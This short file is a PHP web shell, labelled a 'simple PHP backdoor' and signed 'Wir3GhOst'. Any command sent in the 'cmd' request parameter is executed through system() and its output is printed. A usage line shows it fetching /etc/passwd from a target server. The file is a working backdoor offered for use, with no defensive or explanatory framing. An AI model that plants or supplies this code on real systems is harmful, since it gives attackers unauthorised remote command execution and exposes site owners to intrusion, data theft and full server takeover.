<!-- Simple PHP backdoor -->

<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>

Usage: http://target.com/Command_Execute.php?cmd=cat+/etc/passwd

<!--    Wir3GhOst   -->
